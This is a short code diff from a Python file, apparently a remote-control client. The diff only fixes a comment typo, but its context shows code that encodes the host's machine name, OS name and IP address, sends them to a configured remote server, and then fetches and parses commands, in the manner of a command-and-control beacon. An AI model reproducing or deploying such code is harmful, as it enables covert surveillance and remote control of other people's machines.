@@ -65,11 +65,12 @@ def request():
     str = base64.b64encode(data + ',' + cfg.G_PCNAME + ',' + cfg.G_OSNAME + ',' + pip)
     sData = str
     print("sData = " + sData)
-    # Request URL with a get parameter, which makes it easier to store the data on the serverself.
+    # Request URL with a get parameter, which makes it easier to store the data on the server self.
     P_URL = '{0}{1}{2}'.format(cfg.P_BASE, cfg.P_DATA, sData)
     s = urlopen(P_URL).read()
     print(s)
     get_cmd()
+
 
 def parse_cmd(inp, key):
     """
